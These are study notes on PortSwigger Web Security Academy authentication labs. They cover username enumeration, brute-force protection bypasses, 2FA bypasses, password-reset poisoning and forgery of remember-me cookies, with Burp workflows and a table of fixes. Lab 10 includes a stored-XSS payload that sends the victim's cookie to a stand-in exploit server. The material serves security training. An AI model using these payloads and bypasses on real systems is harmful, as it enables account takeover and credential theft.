# Authentication Notes — PortSwigger Web Security Academy

---

## WHAT IS AUTHENTICATION?

Authentication is the process of verifying that a user is who they claim to
be. It's the "front door" of any web application — every other security
control downstream (access control, session management, authorization) can
only work if authentication is solid.

```
Authentication  → "Who are you?"             (you prove your identity)
Session mgmt     → "Is this still you?"       (the server remembers who logged in)
Authorization    → "Are you allowed?"         (what that identity can do)
```

> 📝 It's worth being precise: authentication and authorization (access
> control) are NOT the same thing, even though they're often confused.
> Authentication is proving identity. Authorization is checking what a proven
> identity is allowed to do. You can have perfect authentication and still
> have broken access control — and vice versa. The previous Access Control
> module showed exactly that.

---

## THE THREE AUTHENTICATION FACTORS

Anything an app uses to verify identity falls into one of three categories:

| Factor | Description | Examples |
|---|---|---|
| **Knowledge** | Something you KNOW | Password, PIN, security question |
| **Possession** | Something you HAVE | Authenticator app, hardware token, phone (SMS) |
| **Inherence** | Something you ARE | Fingerprint, face ID, retina scan |

> 📝 Multi-Factor Authentication (MFA/2FA) means using at least TWO of these
> three categories — not just two things from the same category. Using a
> password and a security question is technically only one factor (both are
> knowledge), not two. A password (knowledge) + authenticator code
> (possession) is genuine MFA.

---

## WHY AUTHENTICATION VULNERABILITIES EXIST

Most authentication bugs come from one of three root causes:

**1. Weak brute-force protection**
The app doesn't adequately limit how many guesses an attacker can make.
Rate limiting is absent, easily bypassed (via header manipulation), or
resets too easily (logging in once as yourself resets the counter).

**2. Logic flaws in authentication flows**
Multi-step flows (login → 2FA, forgot password → reset) have each step
individually coded — and it's easy to miss a check on one step, or to
assume earlier steps were mandatory when they weren't.

**3. Information leakage**
The app reveals too much about whether a guess was right or wrong — via
different error messages, different response lengths, different response
times, or HTTP status codes. This lets an attacker enumerate valid usernames
before even attempting passwords.

---

## USERNAME ENUMERATION

Username enumeration means being able to confirm whether a specific username
exists in the system — even before successfully logging in. This turns a
blind credential-stuffing attack into a two-phase, targeted one: find the
usernames first, then bruteforce only their passwords.

**What to look for:**

| Signal | How to detect |
|---|---|
| Different error messages | `Invalid username` vs `Incorrect password` |
| Subtly different messages | `Invalid username or password.` vs `Invalid username or password` (trailing dot) |
| Different response length | Same error text, different byte count in response |
| Different response time | App hashes password before checking username — valid usernames take longer |
| Different status codes | 200 vs 302 on certain flows |
| Account lockout triggering | Only valid accounts get locked after N failures |

> 📝 Response time differences arise because most apps first check if the
> username exists, THEN (only if it does) do the (expensive) password
> hashing/comparison. A valid username → more work → longer response time.
> A very long test password amplifies this timing difference.

---

## BRUTE-FORCE ATTACKS AND PROTECTIONS

Brute-forcing authentication means systematically trying username/password
combinations from a wordlist until one succeeds.

### Common defences and their bypasses:

**IP-based rate limiting:**
The server counts failed attempts per source IP and blocks after N failures.
- Bypass: rotate the source IP via the `X-Forwarded-For` header
  (`X-Forwarded-For: 1.2.3.X` — increment X with each request)
- Bypass: interleave successful logins as your own account (resets the
  counter for many implementations)

**Account lockout:**
The server locks a specific username after N failed attempts.
- Bypass: enumerate usernames FIRST (locked accounts ≠ invalid usernames —
  locking tells you the account is real), then brute-force carefully
- Bypass: the lockout may not apply during a short window before it triggers

**CAPTCHA:**
Requires human interaction to proceed.
- Bypass: if the CAPTCHA token isn't server-validated, reuse a valid one
  across all requests

**Multiple credentials per request:**
Some APIs accept JSON bodies where `password` can be an array — the server
iterates through all values, trying each one. This turns 1000 passwords into
a single request, bypassing per-request rate limiting entirely.

---

## PASSWORD RESET VULNERABILITIES

Password reset flows are a particularly common source of auth bugs because
they involve a multi-step process, often poorly reviewed:

| Vulnerability | How it works |
|---|---|
| Hidden `username` in POST body | Reset request includes a hidden `username` parameter — change it to the victim's username to reset their password |
| Host header poisoning | `X-Forwarded-Host` redirects the password reset link to an attacker-controlled server — victim clicks the link, attacker captures the token |
| Predictable reset token | Token is sequential, timestamp-based, or otherwise guessable |
| Non-expiring token | Tokens never expire and can be reused |

> 📝 The Host header poisoning variant (Lab 11) is particularly subtle: the
> server generates the reset link by reading the `Host` header from the
> incoming request to know what URL to build. If middleware trusts
> `X-Forwarded-Host` over the actual `Host` header, injecting your own
> domain into `X-Forwarded-Host` makes the server generate a reset link
> pointing at YOUR server — and when the victim clicks it, their token
> lands in YOUR access log.

---

## 2FA / MFA BYPASS TECHNIQUES

Even when a second factor is in place, implementation bugs are common:

| Bypass technique | Description |
|---|---|
| Direct navigation | After completing step 1 (username/password), navigate directly to the authenticated area URL — skipping the 2FA prompt entirely |
| Cookie manipulation | 2FA code is tied to a `verify=username` cookie — change the cookie to the victim's username to generate a code for THEM, then brute-force it |
| Brute-force the code | Short codes (4-6 digits) are guessable if there's no lockout on the 2FA endpoint |
| Macro-based brute-force | If logging in resets the session, use a Burp macro to re-run the full login flow before each code guess |

---

## "STAY LOGGED IN" / REMEMBER-ME COOKIE ATTACKS

Many apps implement a persistent "remember me" cookie. If it's implemented
insecurely, it becomes an independent authentication path:

```
Cookie value: base64(username:MD5(password))

Decode: wiener:d8578edf8458ce06fbc5bb76a58c5ca4

Structure is completely predictable: if you know the username and can
enumerate the hash of their password (via XSS cookie theft + crackstation),
you can forge a valid stay-logged-in cookie for ANY user whose password
appears in a public hash database.
```

---

## AUTHENTICATION TESTING SOP

### Step 1 — Map all authentication entry points
- Login form (username/password)
- Social login / OAuth
- 2FA / MFA prompts
- Password reset flow
- "Remember me" / stay-logged-in functionality
- Account registration

### Step 2 — Test for username enumeration
- Submit clearly invalid username + any password → note the exact error message
- Submit a VALID username (e.g. `wiener`) + wrong password → note the response
- Compare: length, exact text, response time, status code

### Step 3 — Test brute-force protection
- Make multiple failed login attempts → does the app lock or rate-limit?
- Try adding `X-Forwarded-For` with rotating IPs — does the limit reset?
- Try logging in successfully once between failed attempts — does the count reset?
- Does the 2FA endpoint have separate rate limiting from the login endpoint?

### Step 4 — Test the password reset flow
- Request a reset for YOUR own account → intercept every request
- Look for a `username` parameter anywhere in the chain
- Try adding `X-Forwarded-Host: your-server.com` to the reset request
- Test whether the reset token expires and whether it can be reused

### Step 5 — Test the 2FA implementation
- After step 1 (credentials), try directly navigating to `/my-account` without completing step 2
- Check for a `verify` cookie — try changing it to another username
- Check how many attempts are allowed before lockout

### Step 6 — Inspect "stay logged in" cookies
- Log in with the "remember me" box checked
- Decode the cookie value (base64 first, then inspect)
- Check if the structure is predictable (username:hash pattern)
- Try forging a cookie for a different user

### Step 7 — Test multi-credential injection (JSON APIs)
- If the login endpoint accepts JSON, check whether `password` accepts an array
- Submit `{"username":"carlos","password":["pass1","pass2","pass3",...]}` with the full wordlist

---

## QUICK BURP WORKFLOW

1. **Username enumeration:** Intruder → Sniper → username position → PortSwigger
   candidate username list → Grep Extract the error message → sort by extracted
   value → the outlier is the valid username
2. **Password brute-force:** repeat with password position and the valid username
   → sort by status code (302 = success) or response length
3. **Timing attack:** Intruder → Pitchfork → `X-Forwarded-For` in position 1
   (incrementing IP wordlist), `username` in position 2 → sort by response time
4. **2FA brute-force:** Intruder → Sniper → mfa-code position → Numeric (0000–9999)
   → 1 thread (avoid session racing) → grep 302 or missing error message
5. **Macro-based brute-force (2FA with auto-logout):** Settings → Sessions →
   New session handling rule → Run a macro → record the full login sequence →
   attach the rule to the Intruder request scope → then Intruder on mfa-code
6. **Stay-logged-in cookie forge:** Decoder → base64 decode → identify structure
   → Intruder with payload processing (MD5 → prefix `username:` → base64 encode)

> 📝 Burp Intruder in Community Edition is throttled (one request at a time,
> slowly). For anything that requires speed (4-digit 2FA codes = 10,000
> requests), either use Burp Pro or consider using `requests` with threading.
> All lab scripts here use `requests` to avoid the throttle.

---
---

## PORTSWIGGER LABS

---

### #01 — Username enumeration via different responses

**URL:** https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
**Vulnerability:** App returns `Invalid username` for bad usernames, `Incorrect password` for valid usernames
**Aim:** Enumerate a valid username, brute-force their password, log in

**Background:**
The login form gives away whether a username exists via a completely distinct
error message — "Invalid username" vs "Incorrect password." This is the
clearest, most exploitable form of username enumeration.

**Analysis:**
```
POST /login   username=notauser&password=test
→ "Invalid username"                ← username doesn't exist

POST /login   username=auth&password=test
→ "Incorrect password"              ← username EXISTS, just wrong password

Now brute-force password for auth:
POST /login   username=auth&password=chelsea
→ 302 Found   ← success
```

> 📝 In Burp Intruder, use "Grep Extract" to pull the error message out of
> each response into a column. Sort by that column — one row will show a
> different value, revealing the valid username immediately, without needing
> to manually read 100+ responses.

---

### #02 — 2FA simple bypass

**URL:** https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
**Vulnerability:** After completing step 1 (credentials), the 2FA step can be skipped by navigating directly to the authenticated area
**Aim:** Log in as `carlos` without his 2FA code

**Background:**
The 2FA prompt is just a page the app REDIRECTS you to after a successful
password check. But the app doesn't actually enforce that you completed the
2FA step before accessing `/my-account` — it only checks that step 1
credentials were valid.

**Analysis:**
```
Log in as carlos (credentials valid) → redirected to /login2 (2FA prompt)

Instead of submitting a code, navigate directly to:
  /my-account?id=carlos
→ 200 OK — fully authenticated as carlos, 2FA was never checked
```

> 📝 This is the multi-step authentication equivalent of the access control
> "skip to step 2" bug from Lab 12 of the Access Control module — same root
> cause, same fix. Every step that depends on a prior step being completed
> must verify that independently, not assume the flow was followed in order.

---

### #03 — Password reset broken logic

**URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
**Vulnerability:** The password reset POST request includes a hidden `username` parameter the client controls
**Aim:** Reset `carlos`'s password and log in as him

**Background:**
Requesting a password reset for your OWN account, following the email link,
and submitting a new password all work correctly — but intercepting the final
POST reveals a hidden `username` field. The server trusts this field instead
of deriving the target username from the reset token itself.

**Analysis:**
```
Request your own password reset → follow the link → fill in new password

POST /forgot-password
temp-forgot-password-token=VALIDTOKEN&username=wiener&new-password-1=test&new-password-2=test
→ 200 OK, wiener's password changed

Change username to carlos:
POST /forgot-password
temp-forgot-password-token=VALIDTOKEN&username=carlos&new-password-1=hacked&new-password-2=hacked
→ 200 OK, carlos's password changed to 'hacked'
```

> 📝 The token is supposed to be the proof that you're the legitimate owner
> of the account being reset — but here the server ignores it in favour of
> a client-supplied `username` field. The token could be anyone's (even
> expired) because it's never actually validated against `username`. This is
> a logic flaw, not a cryptographic one.

---

### #04 — Username enumeration via subtly different responses

**URL:** https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
**Vulnerability:** Valid and invalid usernames return almost identical error messages — but one has a subtle typographical difference (missing trailing period)
**Aim:** Enumerate the valid username and brute-force their password

**Background:**
The developer tried to fix Lab 01 by using the SAME error message for valid
and invalid usernames — but introduced a one-character typo inconsistency.
Valid usernames return `Invalid username or password` (no period). Invalid
ones return `Invalid username or password.` (with period).

**Analysis:**
```
POST /login   username=notauser&password=test
→ "Invalid username or password."   ← with trailing period

POST /login   username=adam&password=test
→ "Invalid username or password"    ← WITHOUT trailing period — this is the valid one
```

**Burp Intruder approach:**
Use Grep Extract to pull the exact error text into a column. Apply a negative
filter to hide all rows containing the version with a period — the one
remaining row is the valid username.

> 📝 Response differences don't have to be obvious to be exploitable — a
> single character, even a punctuation mark, is enough. This is why the
> correct fix is for the server to generate its error messages from a single
> constant, never from two different strings that can drift out of sync.

---

### #05 — Username enumeration via response timing

**URL:** https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
**Vulnerability:** The app processes valid usernames more slowly (bcrypt password hash comparison is expensive) + IP block is bypassable via `X-Forwarded-For`
**Aim:** Enumerate the valid username and brute-force their password

**Background:**
The server checks if the username exists first. If it does, it runs the
submitted password through bcrypt before comparing — an intentionally slow
operation. If the username is invalid, it skips that work and responds
immediately. A very long test password amplifies the timing difference
(more bytes to hash → more time).

**Analysis:**
```
IP block triggers after 3 failed attempts. Bypass:
  X-Forwarded-For: 1.2.3.{i}  (increment i with each request)

Pitchfork attack:
  Position 1: X-Forwarded-For value (rotating IPs)
  Position 2: username (from wordlist)
  Password: an extremely long string (200+ chars, to maximise hash time)

Sort by response time → one username takes significantly longer → valid username

Then brute-force password for that username (new Pitchfork with rotating IPs).
```

> 📝 Timing attacks require you to look at response time, not content. In
> Burp Intruder, the "Response received" column shows elapsed milliseconds
> per request. Sort by this column. The outlier timing is your signal.

---

### #06 — Broken brute-force protection, IP block

**URL:** https://portswigger.net/web-security/authentication/password-based/lab-broken-buteforce-protection-ip-block
**Vulnerability:** IP-based lockout resets if you successfully log in as your own account — so interleaving valid logins between failed attempts keeps the counter from ever triggering
**Aim:** Brute-force `carlos`'s password

**Background:**
After 3 consecutive failed attempts the server blocks the source IP. But a
single successful login resets that counter. Interleaving one valid login
(`wiener:peter`) between every two password attempts means the counter never
reaches the lockout threshold.

**Attack pattern:**
```
wiener:peter     (success — counter resets)
carlos:password1 (fail — counter: 1)
carlos:password2 (fail — counter: 2)
wiener:peter     (success — counter resets)
carlos:password3 (fail — counter: 1)
...and so on
```

**Wordlists:** Build a custom username list alternating `wiener` and `carlos`.
Build a matching password list alternating `peter` and candidate passwords.
Run as a Pitchfork attack (both lists iterate together) with a resource pool
limited to 1 concurrent request.

> 📝 This is a logic flaw — the counter tracks failure streak, not total
> failures. A proper lockout mechanism should consider the total number of
> failed attempts over a time window per account, not just consecutive
> failures that can be interrupted by a valid login.

---

### #07 — Username enumeration via account lock

**URL:** https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
**Vulnerability:** Account lockout only triggers for VALID usernames — submitting a username 5+ times causes it to lock if (and only if) that username exists
**Aim:** Enumerate the valid username, brute-force their password once unlocked

**Background:**
Invalid usernames produce the same error regardless of how many times you
try them. Valid usernames eventually lock and produce a different message
("too many attempts"). Submit every candidate username 5 times — the one
that produces a lockout error is real.

**Analysis:**
```
Cluster Bomb attack:
  Position 1: username (candidate list)
  Position 2: a counter (null payload generating 5 copies per username)

Filter responses: show only those NOT containing "Invalid username or password."
→ The username that appears with a lockout message is valid

Wait for lockout to expire (usually 1 minute) or:
Brute-force password immediately — one password attempt per guess,
looking for the one that returns "Incorrect password" instead of lockout.
→ That password is correct (the valid password won't trigger the lockout message)
```

> 📝 Account lockout designed to protect against brute-force has become the
> brute-force signal itself. Locking only valid accounts while silently
> ignoring invalid ones is the worst of both worlds — it doesn't stop the
> attack AND it hands the attacker a valid username list.

---

### #08 — 2FA broken logic

**URL:** https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
**Vulnerability:** The 2FA code is tied to a `verify` cookie — changing this cookie to a different username generates a 2FA code for THAT user, which can then be brute-forced
**Aim:** Log in as `carlos` by brute-forcing his 2FA code

**Background:**
The 2FA code isn't truly tied to the login session — it's tied to whatever
username is in the `verify` cookie. By manipulating this cookie, you can
force the server to generate and send a 2FA code for `carlos` — even though
you never authenticated as carlos — and then brute-force the 4-digit code
against that same cookie value.

**Analysis:**
```
Step 1: log in as wiener → GET /login2 shows verify=wiener cookie

Step 2: send a GET to /login2 with verify=carlos
→ Server generates a fresh 2FA code for carlos

Step 3: Intruder on POST /login2
  Cookie: verify=carlos
  mfa-code: §0000§ (0000–9999 numeric payload)
→ Sort for 302 response → that code is carlos's

Step 4: use the 302 response's session cookie to access /my-account
```

> 📝 The fundamental problem is that the 2FA code generation is decoupled
> from the authentication session — the server trusts the `verify` cookie
> to decide WHOSE code to generate, rather than using the authenticated
> session. A correctly implemented 2FA system generates the code for
> whoever just completed step 1 of the login, never for an arbitrary
> cookie-supplied username.

---

### #09 — Brute-forcing a stay-logged-in cookie

**URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
**Vulnerability:** Stay-logged-in cookie is `base64(username:MD5(password))` — trivially forgeable for any user whose password is in a common wordlist
**Aim:** Brute-force carlos's stay-logged-in cookie and access his account

**Background:**
The "remember me" cookie encodes no secret — it's just the username and a
well-known hash of their password, wrapped in base64. If the password is in
a common wordlist, you can forge a valid cookie for carlos without ever
knowing his actual password.

**Analysis:**
```
Log in as wiener, keep "Stay logged in" ticked
→ Cookie: stay-logged-in=d2llbmVyOmQ4...
→ Base64 decode: wiener:d8578edf8458ce06fbc5bb76a58c5ca4
→ Hash: d8578edf8458ce06fbc5bb76a58c5ca4 → MD5 of "peter" (confirmed)

Intruder attack on GET /my-account:
  Cookie: stay-logged-in=§§
  Payload: password candidate list
  Payload processing:
    1. Hash: MD5
    2. Add prefix: carlos:
    3. Encode: Base64

Sort for 200 OK (session established) → that's carlos's password hash
```

> 📝 Payload processing in Burp Intruder is a chain of transformations
> applied to each candidate before it's sent. This is where you can chain
> MD5 → prefix → Base64, letting Intruder do all the cookie-forging
> automatically across an entire wordlist. An essential tool for these
> hash-based cookie attacks.

---

### #10 — Offline password cracking

**URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
**Vulnerability:** Stored XSS in blog comments + same base64(username:MD5(password)) stay-logged-in cookie
**Aim:** Steal carlos's stay-logged-in cookie via XSS, crack the MD5 hash, delete his account

**Background:**
Combines a stored XSS to steal the cookie from carlos's browser (when he
visits the blog post) with the same offline hash-cracking from Lab 09 —
except this time you're exfiltrating the hash rather than generating it from
a wordlist.

**Analysis:**
```
Comment payload:
<script>document.location='https://EXPLOIT-SERVER.com/'+document.cookie</script>

→ When carlos views the post, his browser GETs:
  https://EXPLOIT-SERVER.com/secret=wiener:...;stay-logged-in=Y2FybG9z...

→ Base64 decode stay-logged-in: carlos:26323c16d5f4dabff3bb136f2460a943
→ MD5 lookup (crackstation.net): onceuponatime

→ Log in as carlos:onceuponatime → /my-account → delete account
```

> 📝 This lab chains TWO separate vulnerabilities into one exploit: stored
> XSS provides the delivery mechanism (getting code to run in carlos's
> browser), and the insecure cookie design provides the value target. Neither
> vulnerability alone is sufficient — together they produce an account takeover.
> Real-world exploits almost always chain multiple issues; rarely does one bug
> give you everything on its own.

---

### #11 — Password reset poisoning via middleware

**URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
**Vulnerability:** The password reset link is built using the `X-Forwarded-Host` header, which middleware trusts over the actual `Host` header
**Aim:** Poison carlos's password reset link to redirect his token to your server

**Background:**
The app generates the password reset link as:
`https://{Host}/forgot-password?reset_token={token}`
If `X-Forwarded-Host` is trusted, injecting your server's domain substitutes
it into the link. Carlos receives an email saying "click here to reset your
password" — but the link points to YOUR exploit server. He clicks it, his
token arrives in your access log, you use it to reset his password.

**Analysis:**
```
POST /forgot-password
username=carlos
X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net

→ Carlos receives: https://YOUR-EXPLOIT-SERVER.net/forgot-password?temp-forgot-password-token=TOKEN

→ Carlos clicks the link → your server logs: /?temp-forgot-password-token=TOKEN

→ You navigate to: https://TARGET.web-security-academy.net/forgot-password?temp-forgot-password-token=TOKEN
→ Set carlos's password → log in as carlos
```

> 📝 `X-Forwarded-Host` is an HTTP header added by proxies and load balancers
> to preserve the original hostname. Internally the server uses it to build
> absolute URLs. If an application trusts it from user input without
> validation, it's completely attacker-controlled — a classic example of
> implicit trust in infrastructure headers that should never be exposed to
> end-user requests.

---

### #12 — Password brute-force via password change

**URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
**Vulnerability:** The password change form accepts a `username` parameter and returns distinguishable responses depending on whether the current password was correct — even for OTHER users
**Aim:** Brute-force carlos's current password via the change-password endpoint

**Background:**
The password change form requires: current password, new password ×2. Errors
are distinguishable:
- Current password WRONG + mismatched new passwords → "Current password is incorrect"
- Current password RIGHT + mismatched new passwords → "New passwords do not match"

By submitting different values for the two new-password fields (deliberately
mismatched) and a candidate current password, the error message tells you
whether the current password was right — without actually changing anything.

**Analysis:**
```
Intruder on POST /my-account/change-password:
  username=carlos
  current-password=§candidate§
  new-password-1=wrongpass1
  new-password-2=wrongpass2    ← intentionally different to avoid actually changing it

Filter for "New passwords do not match" in response body
→ That candidate is carlos's actual current password
```

> 📝 The intended defence is that you already need to be logged in to use the
> change-password form — but the `username` parameter being client-controlled
> breaks that assumption entirely. The form was designed for a user to change
> their OWN password; the `username` field makes it a universal password
> brute-forcer for anyone.

---

### #13 — Broken brute-force protection, multiple credentials per request

**URL:** https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request
**Vulnerability:** The login endpoint accepts a JSON body where `password` can be an array — the server tries each value, bypassing per-request rate limiting
**Aim:** Log in as `carlos` by submitting all candidate passwords in a single request

**Background:**
Rate limiting counts requests — not passwords per request. If the API accepts
`"password": ["pass1","pass2","pass3",...]`, the server iterates through the
array internally. You can submit 100 passwords as one HTTP request, and the
rate limiter sees only 1 attempt.

**Analysis:**
```
Normal JSON login body:
{"username":"carlos","password":"peter"}

Modified:
{"username":"carlos","password":["123456","password","qwerty","letmein",...]}

→ Server iterates through the array → finds the valid password → returns 302
→ Right-click → Show response in browser → session established as carlos
```

> 📝 This is a particularly elegant bypass because it doesn't try to evade
> the rate limiter — it makes the rate limiter irrelevant by front-loading
> an entire wordlist into a single request. The only way to block this is
> to validate at the APPLICATION layer that `password` is a scalar, not an
> array — which many frameworks don't do by default.

---

### #14 — 2FA bypass using a brute-force attack

**URL:** https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
**Vulnerability:** The 2FA endpoint has no rate limiting, but submitting the wrong code logs you out — requiring a Burp macro to re-authenticate before each guess
**Aim:** Brute-force the 4-digit 2FA code for `carlos:montoya`

**Background:**
The 2FA prompt accepts a 4-digit code (0000–9999 = 10,000 possibilities).
Each wrong guess ends the session, forcing you to log in again before the
next guess. This seems like a practical defence — but Burp macros can
automate the full re-login sequence before each Intruder request.

**Burp macro setup:**
```
Settings → Sessions → Session Handling Rules → New rule
Rule action → Run a macro
Macro: record these 3 requests in order:
  1. GET /login          (load login page, get CSRF token)
  2. POST /login         (submit carlos:montoya credentials)
  3. GET /login2         (load 2FA page — this must complete before the code guess)

Attach rule scope: Intruder, all URLs on the target

Intruder on POST /login2:
  mfa-code=§0000§ (0000–9999 numeric payload)
  Resource pool: 1 concurrent request (critical — prevents session racing)
  Grep: exclude responses containing "Incorrect security code"
→ One request returns 302 → that's the valid code
→ Show response in browser → session established as carlos
```

> 📝 Burp macros are one of the most powerful and underused Community Edition
> features. A macro records an arbitrary sequence of HTTP requests and
> replays them automatically before (or after) each Intruder/Scanner request.
> This effectively lets you automate any multi-step flow — not just 2FA
> re-authentication, but also CSRF token refresh, session renewal, and any
> other stateful operation that would otherwise break a brute-force attack.

---

## REFERENCE — AUTHENTICATION VULNERABILITY QUICK MAP

| Lab pattern | Root cause | Fix |
|---|---|---|
| Different error messages for valid/invalid username | Verbose error disclosure | Return identical error messages regardless of which field was wrong |
| Subtly different error messages | Inconsistent string literals | Generate errors from a single constant, never two separate strings |
| Response timing difference | Password hash only runs for valid usernames | Hash the submitted password regardless of whether the username exists |
| IP block bypass via X-Forwarded-For | Trusting client-supplied forwarding headers | Rate-limit by authenticated identity, not just IP; never trust client-controlled IP headers |
| IP block reset via interleaved logins | Counter tracks consecutive failures, not total failures over time | Sliding-window rate limit per account (not per IP); don't reset on success |
| Account lock reveals valid usernames | Lockout only applies to valid accounts | Apply lockout uniformly to all accounts (or use progressive delays without lockout) |
| 2FA simple bypass (direct navigation) | Step 2 not enforced server-side | Server must track completion of step 1 in the session before permitting access to authenticated resources |
| 2FA broken logic (verify cookie) | 2FA tied to cookie value, not to authenticated session | Generate 2FA code server-side for whoever just authenticated; never accept a cookie-supplied username |
| 2FA brute-force (macro-based) | No rate limiting on 2FA endpoint | Rate-limit the 2FA endpoint independently; invalidate session after N failures |
| Password reset hidden username param | Username in POST body trusted over reset token | Derive the target username from the reset token server-side; never trust a client-supplied username |
| Password reset host header poisoning | X-Forwarded-Host trusted to build reset URLs | Build reset URLs from the server's own configured base URL, never from request headers |
| Stay-logged-in cookie forgeable | Cookie is base64(username:MD5(password)) — predictable | Use a cryptographically random, server-side token with no embedded user data |
| Offline hash cracking (XSS chain) | Predictable cookie format + stored XSS | Fix both: use random token (no hash to crack); sanitise comment input (no XSS to steal it) |
| Password change reveals current-password correctness | Distinguishable errors for right/wrong current password | Return identical error regardless of which field was wrong |
| Multiple credentials per request | JSON array accepted for password field | Validate at application layer that password is a scalar string, never an array |
